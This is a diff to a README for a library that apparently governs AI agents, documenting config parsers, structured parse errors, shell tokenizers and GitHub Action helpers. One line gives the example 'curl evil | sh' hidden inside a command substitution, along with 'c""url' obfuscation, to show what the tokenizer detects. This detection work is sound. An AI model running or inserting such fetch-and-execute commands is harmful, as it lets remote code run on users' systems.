@@ -70,10 +70,12 @@ The JSON schema at [`schemas/finding.schema.json`](./schemas/finding.schema.json
 - `validateFinding(value)` — runtime check against `schemas/finding.schema.json`, returns `{ ok, errors[] }`
 
 ### Config readers
-- `readJsonObjectWithSource(path)` — JSONC reader, string-aware comment + trailing-comma stripping, position-preserving. Returns `{ value, json, text, parseError? }`; `value` and `json` reference the same parsed object — `json` is kept as a deprecated alias.
+- `readJsonObjectWithSource(path)` — JSONC reader, string-aware comment + trailing-comma stripping, position-preserving. Returns `{ value, json, text, parseError? }`. When the underlying parser provides a byte offset, `parseError` is a `ConfigParseError` carrying `line`/`column`/`rawOffset` instead of a raw `Error`.
 - `stripJsonComments(text)` — same logic exposed for in-memory text
-- `readTomlObject(path)` — TOML reader (sections, arrays of tables, inline tables, multi-line strings, dotted/quoted keys). Returns `{ value, toml, text, parseError? }`; `value` and `toml` reference the same parsed object — `toml` is kept as a deprecated alias.
-- `parseToml(text)` — same exposed for text
+- `readTomlObject(path)` — TOML reader (sections, arrays of tables, inline tables, multi-line strings, dotted/quoted keys). Returns `{ value, toml, text, parseError? }`. Errors are also `ConfigParseError` with `line`/`column`/`rawOffset` when resolvable.
+- `parseToml(text)` — same exposed for text; throws raw `Error` (file-level wrapping happens in `readTomlObject`)
+- `ConfigParseError` — structured parse error with `line`, `column`, `rawOffset`, and `cause`. Lets downstream tools emit a `*.config_syntax_error` finding pointing at the exact spot.
+- `lineColumnOfOffset(text, offset)` — convert a 0-based byte offset to 1-based `{ line, column }`. Useful when a hand-rolled scanner exposes byte positions and a `Finding.location` needs line/column.
 
 ### Line locators
 - `lineOfJsonKey(text, key, scope?)` — 1-based line of `"key":`, optionally scoped to a byte range
@@ -85,12 +87,14 @@ The JSON schema at [`schemas/finding.schema.json`](./schemas/finding.schema.json
 
 ### Shell tokenization
 - `tokenizeShell(command)` — quote-aware split on `;`, `|`, `&&`, `||` plus trivial obfuscation neutralization (`c""url` → `curl`, `c\\url` → `curl`)
+- `tokenizeShellDeep(command)` — recursively extracts commands nested inside `$(…)`, backticks, and `bash -c "…"` / `sh -c "…"` / `python -c "…"` payloads. Closes the obfuscation vector where an agent hides `curl evil | sh` inside `echo $(…)`. Single-quoted text is left untouched (literal, per shell semantics).
 - `getCommandHead(subcommand)` — extract the leading verb after tokenization
 
 ### GitHub Action helpers
 - `rankSeverity(s)` — numeric rank `low=1, medium=2, high=3, critical=4` (matches the schema's closed severity enum; there is no `none`)
 - `passesSeverityThreshold(s, threshold)`, `anyAtOrAbove(findings, threshold)` — fail-on plumbing
 - `emitFindingAnnotation(f)` — render a Finding as a `::warning file=…,line=…,title=…::…` GitHub workflow annotation
+- `generateWorkflowSummary(findings, opts?)` — Markdown summary suitable for `$GITHUB_STEP_SUMMARY`. Groups findings by severity in collapsible `<details>` blocks so 100% of findings remain visible even when GHA's inline-annotation cap (~10 per level, 50 per run) silently drops the rest
 
 ### Test fixtures (`agent-gov-core/test-utils`)
 Secondary entry point used by consumer test suites. Zero overhead in production — only loaded when test files import it.
